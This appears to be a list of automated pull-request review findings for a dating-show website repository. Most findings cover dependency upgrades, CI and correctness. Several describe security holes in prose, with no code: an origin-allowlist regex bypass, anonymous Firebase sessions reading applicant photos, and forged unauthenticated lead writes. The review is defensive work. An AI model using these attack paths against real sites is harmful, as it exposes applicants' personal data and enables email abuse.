- [ ] HIGH: [DEPS] package.json:58, nodemailer jumps a major version (9→10) on the production email path with zero accompanying code changes, and the engines floor leaping from node >=6 to >=20 signals a substantial rewrite; a breaking change to transport/sendMail semantics would pass CI (tests mock the transport) and only surface as runtime send failures for applicant, waitlist, and producer notification emails. | Files: package.json | PR: #257 | Head: 91a19035ca6fa25d5842eda84195d1b3fa688791
- [ ] HIGH: [TYPES] package.json:80, @types/nodemailer remains at ^8.0.1 — two majors behind the new v10 runtime — so TypeScript validates all mailer calls against the v8 API surface; a v10 removal or signature change compiles clean and then throws in production the first time an email is sent. | Files: package.json | PR: #257 | Head: 91a19035ca6fa25d5842eda84195d1b3fa688791
- [ ] MEDIUM: [TEST] package.json:97, vitest 5.0.0 deletes @vitest/expect, @vitest/runner, @vitest/snapshot, @vitest/utils, and @vitest/pretty-format from the dependency tree entirely; any test setup file, custom matcher, or reporter that imports from those packages fails module resolution and the whole test suite errors out on the next CI run, and v5 snapshot-format changes can additionally invalidate committed snapshots (commit 255 touched admin snapshots). | Files: package.json | PR: #257 | Head: 91a19035ca6fa25d5842eda84195d1b3fa688791

<!-- fable-routed PR #257 head 91a19035ca6fa25d5842eda84195d1b3fa688791 -->

- [ ] MEDIUM: [COMPAT] package.json:60, eslint 10 is a major release that removes legacy eslintrc config support entirely (the lockfile shows @eslint/eslintrc, globals, and strip-json-comments dropped from eslint's dependency tree), so if this repo's lint config or any editor/CI tooling still loads a legacy-format config or relies on ESLINT_USE_FLAT_CONFIG, `npm run lint` and the pre-merge lint gate will start erroring immediately after merge. | Files: package.json | PR: #253 | Head: 0c7fee3343f206621469d6e8523e98cfc838a03f
- [ ] MEDIUM: [COMPAT] package.json:58, eslint-plugin-react-hooks ~7.1.1 and eslint-plugin-react-refresh ^0.5.3 are left unbumped alongside the eslint 9→10 jump, and eslint 10 removes deprecated rule/context APIs, so a plugin that has not declared eslint ^10 support can either fail `npm ci` with a peer-dependency conflict on a fresh checkout or crash mid-lint with a removed-API error, silently leaving React hooks violations unchecked if lint is configured to continue on plugin load failure. | Files: package.json | PR: #253 | Head: 0c7fee3343f206621469d6e8523e98cfc838a03f

<!-- fable-routed PR #253 head 0c7fee3343f206621469d6e8523e98cfc838a03f -->

- [ ] HIGH: [SCOPE-MISMATCH] src/pages/cities/[slug].astro:1, the PR is titled "remove em dash from social CTA copy" but actually deletes the communityStats feature, rewrites the CTA stack, and introduces raw-HTML injection via regex on all city pages; an approver reading only the title would merge a full template redesign believing it was a one-character copy tweak. | Files: (none cited) | PR: #252 | Head: 62e57f4c7586ae2f821ea2f7a1bebca1bc34b4af
- [ ] MEDIUM: [ESCAPING-LOSS] src/pages/cities/[slug].astro:186, switching body paragraphs and FAQ answers from escaped text interpolation to `set:html` means any `<`, `>` or `&` in the 300+ city data files now parses as markup; a paragraph like "over 500 singles & counting" or "groups < 8 people" silently truncates or corrupts the rendered page with no build error. | Files: (none cited) | PR: #252 | Head: 62e57f4c7586ae2f821ea2f7a1bebca1bc34b4af
- [ ] MEDIUM: [WRONG-LINK] src/pages/cities/[slug].astro:132, `applyHref` is guessed as the first CTA whose href isn't "#waitlist", so for any city whose non-waitlist CTA is a ticket or event link, every inline "apply now"/"apply to be a contestant" phrase links there instead of the apply page; the unescaped `${href}` interpolation into the attribute also breaks the markup if any CTA href ever contains a quote. | Files: (none cited) | PR: #252 | Head: 62e57f4c7586ae2f821ea2f7a1bebca1bc34b4af

<!-- fable-routed PR #252 head 62e57f4c7586ae2f821ea2f7a1bebca1bc34b4af -->

- [ ] MEDIUM: [accidental-data-change] src/components/admin/ApplicantCard.tsx:57, the new "Mark as participated" button is rendered at opacity 0 but remains tappable and focusable, so on a touch device (no hover to reveal it) a tap in the top-right 48px of an applicant photo silently sets status to "Participated" with no confirmation and the applicant vanishes from the active grid into a collapsed section. | Files: src/components/admin/ApplicantCard.tsx | PR: #251 | Head: 3bf2d8abd6a724db727276633aa0d829af00898c
- [ ] MEDIUM: [contract-violation] src/types/application.ts:28, "Participated" was added to the status union but not to any editable status control (the dashboard STATUS_OPTIONS filter omits it and the modal's status dropdown was not updated), so if the modal's dropdown still lists only the four old statuses, opening a Participated applicant renders a controlled select whose value isn't among its options, and saving from that modal can silently rewrite the status back to another value — and there is no deliberate way to undo an accidental "Participated" mark. | Files: src/types/application.ts | PR: #251 | Head: 3bf2d8abd6a724db727276633aa0d829af00898c
- [ ] MEDIUM: [silent-failure] src/layouts/BaseLayout.astro:180, noCursor only skips the custom-cursor JavaScript while the #cursor/#cursorRing elements and any global cursor-hiding CSS still apply, so if the stylesheet sets cursor:none for fine-pointer devices, an admin on desktop gets an invisible mouse pointer (or a stuck cursor dot at the top-left) on /admin. | Files: src/layouts/BaseLayout.astro | PR: #251 | Head: 3bf2d8abd6a724db727276633aa0d829af00898c

<!-- fable-routed PR #251 head 3bf2d8abd6a724db727276633aa0d829af00898c -->

- [ ] MEDIUM: [TEST-ISOLATION] test/sync-orders.test.ts:4, the unit test imports `orderSyncableEvents` from the live API route module `src/pages/api/sync-orders.ts`, which transitively loads firebase, CAPI, and ops-alert modules into vitest; if any of those ever gains module-scope initialization (env-credential reads, client construction, network setup), this pure filter test starts failing or touching real services in CI — the helper belongs in a side-effect-free lib module that both the route and the test import. | Files: src/pages/api/sync-orders.ts test/sync-orders.test.ts | PR: #250 | Head: 620768d9c9c664d5d2bd64a62b379506ccfa6d7e

<!-- fable-routed PR #250 head 620768d9c9c664d5d2bd64a62b379506ccfa6d7e -->

- [ ] HIGH: [SECURITY] BUGS.md:1, deleting BUGS.md/ENHANCEMENTS.md/README ops sections from HEAD does not remove them from git history, so publishing the repo still exposes the full open-vulnerability inventory, the Firebase project ID and backup bucket name, and anything else ever committed; an attacker browses the public commit history, reads the "Open" entries (e.g. `allow create: if true` on the applications collection, unauthenticated capture-lead/update-lead writes) and exploits the still-unfixed holes directly. | Files: BUGS.md BUGS.md/ENHANCEMENTS.md e.g | PR: #241 | Head: 59812505cb865287e1bb7a97c5d995b38491e89d
- [ ] HIGH: [SECURITY] storage.rules:6, the new comment claims photos are admin-only but `request.auth != null` is satisfied by the anonymous sign-in the public apply flow depends on, so any visitor can mint an anonymous session against the public Firebase config and read applicant photos by ID — the hardening is illusory while the PII exposure remains. | Files: request.auth storage.rules | PR: #241 | Head: 59812505cb865287e1bb7a97c5d995b38491e89d
- [ ] MEDIUM: [CORRECTNESS] storage.rules:9, the write rule narrows from `image/.*` to a jpeg/png/webp/heic whitelist while the client still uses `accept="image/*"` with no matching type check, so an applicant who selects a GIF passes client validation, the upload is denied by rules, and they get a generic error with their application never submitted. | Files: storage.rules | PR: #241 | Head: 59812505cb865287e1bb7a97c5d995b38491e89d
- [ ] MEDIUM: [DATA-LOSS] BUGS.md:1, the tracker for still-open HIGH security bugs is deleted without those bugs being fixed or migrated anywhere, so known live issues (Firestore application validation, rate limiting, phone-overwrite) lose their only record at exactly the moment the code becomes publicly inspectable. | Files: BUGS.md | PR: #241 | Head: 59812505cb865287e1bb7a97c5d995b38491e89d
- [ ] MEDIUM: [CONTRACT] README.md:15, the Quick Start clone URL (and package.json:11 repository URL) point to `hellosurbhi/garam-masala-dating.git` while this repo is `hellosurbhi/garam-website`, so a new contributor following the README gets a 404 on `git clone`. | Files: README.md hellosurbhi/garam-masala-dating.git package.json | PR: #241 | Head: 59812505cb865287e1bb7a97c5d995b38491e89d
- [ ] MEDIUM: [SILENT-FAILURE] SECURITY.md:7, the policy routes vulnerability reports to security@garammasaladating.com with a promised 48-hour acknowledgment, but that alias is not verified to exist (known public aliases are hello@/contact@/press@), so a researcher's report could bounce or vanish and a real vulnerability goes unread. | Files: SECURITY.md garammasaladating.com | PR: #241 | Head: 59812505cb865287e1bb7a97c5d995b38491e89d

<!-- fable-routed PR #241 head 59812505cb865287e1bb7a97c5d995b38491e89d -->

- [ ] MEDIUM: [TRANSITIVE-MAJOR] package-lock.json:7730, despite the "minor-and-patch" PR title, @astrojs/vercel 11.0.10 silently pulls @vercel/routing-utils from 5.3.3 to 6.5.0 (a two-major jump), which governs how routes, redirects, and headers are generated for Vercel deploys; a behavior change in route generation could ship on merge with no code diff to review, so the next preview deploy should be smoke-tested (key pages, redirects, API routes) before promoting to production. | Files: package-lock.json | PR: #268 | Head: 629d7037818c5743e786efd2b94a33568a5d0d84

<!-- fable-routed PR #268 head 629d7037818c5743e786efd2b94a33568a5d0d84 -->

- [ ] HIGH: [RUNTIME-DEP] package.json:58, nodemailer 9→10 is the only production-runtime dependency in an otherwise dev-tooling major group, and since the test suite mocks the mail transport, a v10 breaking API change (removed/renamed transport options or send behavior) passes CI and only surfaces when the next applicant or producer notification email fails to send in production. | Files: package.json | PR: #267 | Head: f18679cf3df41ddb33e5da8654360e3a44fb4087
- [ ] MEDIUM: [TYPE-DRIFT] package.json:80, @types/nodemailer stays at ^8.0.1 while the runtime jumps to 10.x, so TypeScript keeps accepting calls to APIs removed or changed across two majors and a compile-time error becomes a runtime send failure in the email code paths. | Files: 10.x package.json | PR: #267 | Head: f18679cf3df41ddb33e5da8654360e3a44fb4087
- [ ] MEDIUM: [SILENT-BEHAVIOR] package.json:92, prettier-plugin-astro 1.0.0 replaces the JS Astro compiler with the native @astrojs/compiler-rs and moves prettier to a peerDependency requiring ^3.5.3, so formatting output can differ and the next lint-staged/format-check run either mass-reformats every .astro file or fails the pre-commit/CI gate until formatting is reconciled (and an older pinned prettier would break install). | Files: package.json | PR: #267 | Head: f18679cf3df41ddb33e5da8654360e3a44fb4087

<!-- fable-routed PR #267 head f18679cf3df41ddb33e5da8654360e3a44fb4087 -->

- [ ] MEDIUM: [PARTIAL-SECRET-GUARD] .github/workflows/deploy-rules.yml:50, the fail-loud guard checks only FIREBASE_SERVICE_ACCOUNT while the deploy and drift steps also require FIREBASE_PROJECT_ID and four FIREBASE_ADMIN_*/bucket secrets; if FIREBASE_PROJECT_ID is unset, `--project ""` is falsy to the firebase CLI and it silently falls back to the `.firebaserc` default project, so the deploy can target an unintended project (or die later with a confusing error) despite the header's "missing secret fails the run" contract. | Files: .github/workflows/deploy-rules.yml | PR: #266 | Head: 1d19918e05e4c3f1a5a760f430dad4ec45750530

<!-- fable-routed PR #266 head 1d19918e05e4c3f1a5a760f430dad4ec45750530 -->

- [ ] MEDIUM: [HIDDEN-MAJOR-BUMP] package-lock.json:7735, the "minor-and-patch" group silently carries a transitive major upgrade of @vercel/routing-utils from 5.3.3 to 6.5.0 inside the runtime @astrojs/vercel adapter, so if v6 changed how redirects/rewrites/route configs are emitted, the next production deploy to Vercel could serve different routing (broken redirects or 404s on previously working paths) with no source change to explain it. | Files: package-lock.json | PR: #274 | Head: 712726a7467d5150bf3e3148a274bdcfa57179f1

<!-- fable-routed PR #274 head 712726a7467d5150bf3e3148a274bdcfa57179f1 -->

- [ ] HIGH: [correctness] src/data/cities/us-northeast.ts:138, reordering Boston's CTAs puts a "/tickets" href first, and `src/pages/cities/[slug].astro:121` computes `applyHref` as the first CTA whose href is not "#waitlist", so on the Boston page every element rendered from `applyHref` now points to /tickets instead of /apply?city=Boston&state=MA — a visitor tapping the apply control lands on the ticket page and never reaches the contestant form. | Files: src/data/cities/us-northeast.ts | PR: #263 | Head: 9445035d1a97d7a4fcead117d1ee9e3f85f1564a
- [ ] MEDIUM: [scope-creep] CHANGELOG.md:24, a PR titled and documented as a CI overhaul silently bundles a Boston event launch (us-northeast.ts, events.ts, tickets.astro) that the "Files affected" list omits — if the CI changes are later reverted for a pipeline problem, the revert also unpublishes the live Boston event, tickets link, and schema with no record explaining why. | Files: CHANGELOG.md events.ts tickets.astro us-northeast.ts | PR: #263 | Head: 9445035d1a97d7a4fcead117d1ee9e3f85f1564a
- [ ] MEDIUM: [data-integrity] src/data/events.ts:300, the new Boston show is dated 2026-08-02 while the immediately following pre-existing Manhattan entry is the same date, double-booking the two-host show in two cities 200 miles apart on one evening — if one date is wrong, ticket buyers and the event schema publish a show that cannot happen as listed. | Files: src/data/events.ts | PR: #263 | Head: 9445035d1a97d7a4fcead117d1ee9e3f85f1564a
- [ ] MEDIUM: [flaky-gate] lighthouserc.js:12, `numberOfRuns: 1` combined with `"categories:performance": ["error", {minScore: 0.9}]` gates merges on a single Lighthouse run on a shared CI runner, whose performance score routinely swings ±5-10 points under noisy-neighbor load — clean PRs will intermittently fail CI, directly contradicting the PR's stated goal that every failure means something is wrong. | Files: lighthouserc.js | PR: #263 | Head: 9445035d1a97d7a4fcead117d1ee9e3f85f1564a
- [ ] MEDIUM: [test-coverage] stryker.config.mjs:10, widening the exclusion from six named static-data files to `!src/**/data/**/*.ts` also removes `src/data/journal` and `src/data/events.ts` — modules containing real logic like `getPostBySlug()` — from mutation testing, so a survivable mutant in exactly the published/unpublished filtering code that caused the 6-week link-check failure would now go undetected. | Files: src/data/events.ts stryker.config.mjs | PR: #263 | Head: 9445035d1a97d7a4fcead117d1ee9e3f85f1564a

<!-- fable-routed PR #263 head 9445035d1a97d7a4fcead117d1ee9e3f85f1564a -->

- [ ] HIGH: [breaking-change] package.json:35, this is a major upgrade (astro 6.x to 7.x) mislabeled as a routine chore — Astro 7 swaps the entire build toolchain (Vite 7 to Vite 8, which replaces the rollup/esbuild bundler with rolldown 1.1.3) and replaces the whole markdown engine (@astrojs/markdown-remark removed, new @astrojs/markdown-satteri/satteri 0.9.x Rust pipeline), so merging on green install alone risks a failed or subtly different production build on the next deploy. | Files: 0.9.x 6.x 7.x package.json | PR: #262 | Head: 3e3869f442fdef6c7990419862bb1f2a3ea95314
- [ ] HIGH: [compat] package-lock.json:8565, astro jumps to 7.0.3 but @astrojs/vercel stays pinned at ^10.0.8 with no lockfile change, so if that adapter's peer range only covers astro 6 the next `npm install`/Vercel build can fail with an unresolvable peer conflict or ship an adapter running against an API surface it was never built for. | Files: package-lock.json | PR: #262 | Head: 3e3869f442fdef6c7990419862bb1f2a3ea95314
- [ ] MEDIUM: [contract] package-lock.json:8641, astro 7 demotes @astrojs/markdown-remark to an optional peer and drops remark-gfm, remark-smartypants, rehype-raw and the rest of the remark/rehype tree from the lockfile, so any remark/rehype plugins or markdown-relying pages in astro.config will either fail to load or silently render differently (tables, smart quotes, raw HTML) with no build error. | Files: astro.config package-lock.json | PR: #262 | Head: 3e3869f442fdef6c7990419862bb1f2a3ea95314
- [ ] MEDIUM: [environment] package-lock.json:198, the new native compiler/bundler binaries all require Node ^20.19.0 or >=22.12.0, so a CI runner or Vercel project pinned to Node 18 or an older 20.x will start failing installs/builds the moment this merges even though nothing in the repo's own code changed. | Files: 20.x package-lock.json | PR: #262 | Head: 3e3869f442fdef6c7990419862bb1f2a3ea95314

<!-- fable-routed PR #262 head 3e3869f442fdef6c7990419862bb1f2a3ea95314 -->

- [ ] MEDIUM: [incomplete-fix] tests/smoke/critical-flows.spec.ts:62, the new mock silences only `/api/alert-failure` but not other same-origin side-effect routes the apply flow can reach (the repo has a producer notification route, `/api/notify-application`, per commits #230/#243), so once the open production-mode failure is fixed and the happy path actually succeeds against production with Firestore mocked to accept the write, the success path would hit the real notification endpoint and email the producer the `Smoke Tester` fixture on every scheduled run — the exact class of bug LESSONS.md's new rule ("audit every route with a side effect, not just third-party ones") was written to prevent. | Files: LESSONS.md tests/smoke/critical-flows.spec.ts | PR: #250 | Head: d64f6cc8c5e196ffbe259223c984269ac64c152f

<!-- fable-routed PR #250 head d64f6cc8c5e196ffbe259223c984269ac64c152f -->

- [ ] HIGH: [SECURITY] src/pages/api/notify-application.ts:129, the Vercel preview regex `^https:\/\/[\w-]+-hellosurbhi\.vercel\.app$` matches any project name ending in "-hellosurbhi", so an attacker can register a free Vercel project like `evil-hellosurbhi` and host a page whose browser origin passes the allowlist, defeating the guard and letting scripted cross-site requests trigger unlimited Resend emails. | Files: src/pages/api/notify-application.ts | PR: #242 | Head: 877aa7a1137f0f582c1b247c7ffaefdada5126d1
- [ ] MEDIUM: [SECURITY] storage.rules:6, the new `allow read: if request.auth != null` is annotated as admin-only but the apply flow enables anonymous Firebase Auth (`signInAnonymously`), so anyone can mint an anonymous session and still enumerate/read applicant PII photos, meaning the claimed lockdown does not actually restrict access. | Files: request.auth storage.rules | PR: #242 | Head: 877aa7a1137f0f582c1b247c7ffaefdada5126d1
- [ ] MEDIUM: [DATA-LOSS] storage.rules:9, the server-side content-type allowlist (jpeg/png/webp/heic) is stricter than the client's `accept="image/*"` file picker, so an applicant selecting a GIF, AVIF, or HEIF photo passes client validation but `uploadBytes()` is rejected by rules with only a generic error toast, and the application is lost. | Files: storage.rules | PR: #242 | Head: 877aa7a1137f0f582c1b247c7ffaefdada5126d1
- [ ] MEDIUM: [DATA-EXPOSURE] BUGS.md:1, deleting BUGS.md (and the README's backup-bucket/GCP project details) removes them only from HEAD, not git history, so when this "prepare for public release" work ships, anyone can check out prior commits and read a curated list of still-open vulnerabilities (unvalidated `applications` writes, unauthenticated phone overwrites, no rate limiting) plus internal infrastructure names. | Files: BUGS.md | PR: #242 | Head: 877aa7a1137f0f582c1b247c7ffaefdada5126d1
- [ ] MEDIUM: [SILENT-FAILURE] src/pages/api/notify-application.ts:124, rejecting every request with a missing Origin header returns 403 for legitimate submitters whose browsers or privacy proxies strip Origin, so the Firestore application is created but the producer notification email is never sent and nobody notices the gap. | Files: src/pages/api/notify-application.ts | PR: #242 | Head: 877aa7a1137f0f582c1b247c7ffaefdada5126d1

<!-- fable-routed PR #242 head 877aa7a1137f0f582c1b247c7ffaefdada5126d1 -->

- [ ] MEDIUM: [SECURITY-DISCLOSURE] .claude-wontfix-items.txt:2, this commit adds a distilled, attacker-useful description of a live unpatched production exposure (the undeployed Firestore/storage rules, the exact field the deployed rules reject, and the still-open PII-read hole the pending deploy would close) into a repo that commit 241 prepared for public release, so if the repo is or becomes public before Surbhi runs the one-command rules deploy, anyone can read the recipe for the stale-rules gap and use it to read applicant data. | Files: .claude-wontfix-items.txt | PR: #239 | Head: aec10cf8dd8ddaeee1d8041753375a5502190796

<!-- fable-routed PR #239 head aec10cf8dd8ddaeee1d8041753375a5502190796 -->

- [ ] MEDIUM: [correctness] src/pages/api/sync-orders.ts:47, `getSyncableEvents` returns true for any event with no `isoDate`, so an undated "eventbrite-owned" event with an `eventbriteId` stays in the syncable set forever and defeats the blast-radius cap the WHY comment promises; a TBA show (exactly Edison's pre-fix shape) whose Eventbrite event is later deleted or inaccessible would fail its fetch every run indefinitely, holding the shared `changed_since` cursor and silently stalling Purchase sync for all current shows — and the new test at sync-orders.test.ts:60 pins this hole in place. | Files: src/pages/api/sync-orders.ts sync-orders.test.ts | PR: #237 | Head: f62d213fa80cfc021cd74a7884030dd6226f3756

<!-- fable-routed PR #237 head f62d213fa80cfc021cd74a7884030dd6226f3756 -->

- [ ] MEDIUM: [contract] src/lib/leadSubmission.ts:72, the client now hard-requires `ok: true` (and for captureLead a non-empty string `id`) in the response body of /api/capture-lead and /api/update-lead, but no server endpoint changed in this PR and the unit-test mock had to be edited from `{}` to `{ ok: true }` to pass — if the deployed endpoints return 200 with any other body shape (e.g. `{}` or `{ success: true }`), every signup and phone update throws "Could not confirm your signup" after the server has already saved, exactly the false-failure the PR claims to fix. | Files: e.g src/lib/leadSubmission.ts | PR: #279 | Head: 4d40c675c54c24f8c3a2f553ddd9cbd282583b3f

<!-- fable-routed PR #279 head 4d40c675c54c24f8c3a2f553ddd9cbd282583b3f -->

- [ ] MEDIUM: [UNAUTHORIZED-SEND] ENHANCEMENTS.md:1439, the nodemailer-types entry's Verify step instructs "one real transactional send still goes out through the Zoho path" with no recipient or account named and no sign-off gate, so the autonomous 3:00 fixer lane that consumes these entries would dispatch a real outbound email without Surbhi's approval, violating the repo owner's standing explicit-sign-off rule for all sends. | Files: ENHANCEMENTS.md | PR: #286 | Head: 9b8123ef1fa84560c13239b388e1f7c29e5f29ec

<!-- fable-routed PR #286 head 9b8123ef1fa84560c13239b388e1f7c29e5f29ec -->

- [ ] HIGH: [correctness] src/lib/markets.ts:527, a typed city that resolves to no market is silently overridden by sourceCitySlug at high confidence, so a lead who types "Mumbai" or "Bakersfield, CA" after browsing the Edison or Los Angeles page is bucketed into that market as `high`/`source-city` and enters automatic sends despite having explicitly stated they live elsewhere. | Files: src/lib/markets.ts | PR: #285 | Head: 6973b223eddd04060496b314ecaa64e7e621a539
- [ ] MEDIUM: [contract-violation] src/lib/markets.ts:512, `exact = aliasIndex.has(parsed.name)` tests the name globally rather than whether the match actually came from an alias, so a state-rollup match whose name collides with another market's alias — "Columbus, GA" (collides with Columbus OH) or "Portland, TN" — grades `high` instead of the designed `medium`, promoting rollup guesses into the auto-send pool. | Files: aliasIndex.has parsed.name src/lib/markets.ts | PR: #285 | Head: 6973b223eddd04060496b314ecaa64e7e621a539
- [ ] MEDIUM: [correctness] src/lib/markets.ts:224, the STATE_NAMES keys "washington_state" and "new york state" are unreachable (basicNorm never emits underscores, the word-path tail checks never produce those strings, and the comma branch at line 277 is dead because basicNorm already replaced every comma with a space), so "Queens, New York" or "Tacoma, Washington" parses with no state, matches no alias, and the lead lands in the unbucketed pile. | Files: src/lib/markets.ts | PR: #285 | Head: 6973b223eddd04060496b314ecaa64e7e621a539

<!-- fable-routed PR #285 head 6973b223eddd04060496b314ecaa64e7e621a539 -->

- [ ] MEDIUM: [security] firestore.rules:63, the rule lets an unauthenticated writer stamp `marketSource: 'self-reported'` and `marketConfidence: 'high'` itself, so the provenance fields prove nothing: a bot POSTing directly to the Firestore REST API (bypassing capture-lead.ts entirely, exactly as the writer does) can create leads with any victim's email tagged high-confidence into any market, and the planned announcement automation will then email those victims — the 'low'-confidence safeguard only filters honest geo noise, not forged entries. | Files: capture-lead.ts firestore.rules | PR: #284 | Head: b0afac086d991c6e89bb3470d25ab8c8450f89d9

<!-- fable-routed PR #284 head b0afac086d991c6e89bb3470d25ab8c8450f89d9 -->

- [ ] HIGH: [availability] src/lib/outreach/publishedShows.ts:66, `publishedShows()` has no fallback or error handling, so once OUTREACH_ONLINE=1 every public page (home, tickets, links, cities, events) and the /api/go ticket redirect does a live Firestore list per request; one Firestore 503, token-mint failure, or a single malformed emailShows document (decode throws "repair required") makes the entire public site and all ticket links return 500 until manually repaired. | Files: src/lib/outreach/publishedShows.ts | PR: #306 | Head: 9d690de1422451bcbd7d42e76c45c26a48aba4a7
- [ ] MEDIUM: [contract-violation] src/lib/outreach/worker.ts:61, the reversed-milestone selection abandons an unfinished announcement the moment Monday/Friday becomes due; at the enforced pace (~2 sends per 2-minute tick, ~900/day across two accounts) a 1,561-recipient announcement takes ~42 hours, so a show saved less than two days before Monday 9 AM leaves hundreds of recipients permanently without the announcement and no dashboard indication of the shortfall. | Files: src/lib/outreach/worker.ts | PR: #306 | Head: 9d690de1422451bcbd7d42e76c45c26a48aba4a7
- [ ] MEDIUM: [silent-failure] src/pages/api/cron/email.ts:23, `refreshContacts` runs before the sender every tick and its completion marker is only written at the end, so a persistently failing/slow refresh (large leads collection exceeding the function timeout after 12:00 UTC) aborts every tick before any sending, halting all scheduled reminders for the day while the alert is deduplicated to once per hour. | Files: src/pages/api/cron/email.ts | PR: #306 | Head: 9d690de1422451bcbd7d42e76c45c26a48aba4a7
- [ ] MEDIUM: [duplicate-send] scripts/prepare-email-audience.py:47, imported history keys are rewritten to `manhattan-<date>` while the dashboard auto-generates show ids from whatever city text the admin types (ShowEditor.tsx:40), so re-adding an already-announced show as "NYC" or "New York" misses the history records and re-announces to the full ~1,561-contact list. | Files: ShowEditor.tsx scripts/prepare-email-audience.py | PR: #306 | Head: 9d690de1422451bcbd7d42e76c45c26a48aba4a7
- [ ] MEDIUM: [data-loss] src/lib/outreach/publishedShows.ts:16, unchecking "Publish on the website" deletes the merged entry (including a legacy catalog entry with the same id), so every previously shared `/events/<slug>` page and `/api/go/<slug>` tracked ticket link in old emails and bios starts returning 404 even though those pages were designed to be permanent. | Files: src/lib/outreach/publishedShows.ts | PR: #306 | Head: 9d690de1422451bcbd7d42e76c45c26a48aba4a7
- [ ] MEDIUM: [timeout] src/pages/api/admin/email/import.ts:50, each 100-record batch performs up to ~200 sequential Firestore round trips (a get then a put per record), roughly 10–20 seconds per request, which can exceed the serverless function limit; the browser importer then fails mid-run with a generic 400 and restarts from batch one on retry, potentially never completing the one-time audience import. | Files: src/pages/api/admin/email/import.ts | PR: #306 | Head: 9d690de1422451bcbd7d42e76c45c26a48aba4a7
- [ ] MEDIUM: [efficiency] src/pages/events/[slug].astro:46, moving Eventbrite content resolution from build time to per-request means every page view of an "our-eventbrite" event calls the Eventbrite API with no caching; a traffic spike (e.g. right after an announcement email lands) adds per-view latency and burns Eventbrite rate limits exactly when conversion matters most. | Files: e.g | PR: #306 | Head: 9d690de1422451bcbd7d42e76c45c26a48aba4a7

<!-- fable-routed PR #306 head 9d690de1422451bcbd7d42e76c45c26a48aba4a7 -->

- [ ] HIGH: [COMPAT] package.json:56, firebase 13.0.0 (and every bundled @firebase/* package) raises its engine requirement from node >=20 to node >=24.12.0, but the Node 24 migration lives in the separate, unmerged PR #309 — if #305 merges or deploys first, install/build on the current Node 22 toolchain fails (or runs an unsupported combination silently if engine checks are warnings-only on Vercel). | Files: package.json | PR: #305 | Head: 480c968ea5f120a4b15ac0f75a9b445d257c738d
- [ ] MEDIUM: [BREAKING] package.json:56, firebase 12→13 is a major client-SDK bump (including @firebase/ai 2→3 and firestore 4.17→4.18) with zero application code changes in this PR; any API removed or renamed in v13 would surface as a build/type failure or, worse, a runtime failure in the firestore-backed signup, application, and waiver flows this repo has a history of breakage in (PRs #301, #279). | Files: package.json | PR: #305 | Head: 480c968ea5f120a4b15ac0f75a9b445d257c738d
- [ ] MEDIUM: [BREAKING] package.json:46, @astrojs/react 6→7 swaps its compiler layer — @vitejs/plugin-react 6.x drops the Babel pipeline entirely (babel core, react-refresh, jsx-self/source transforms all removed from the prod tree) — with no accompanying astro.config or component changes; any Babel-dependent option or plugin configured for React islands stops being applied, potentially breaking hydration or dev refresh without an install-time error. | Files: 6.x astro.config package.json | PR: #305 | Head: 480c968ea5f120a4b15ac0f75a9b445d257c738d

<!-- fable-routed PR #305 head 480c968ea5f120a4b15ac0f75a9b445d257c738d -->
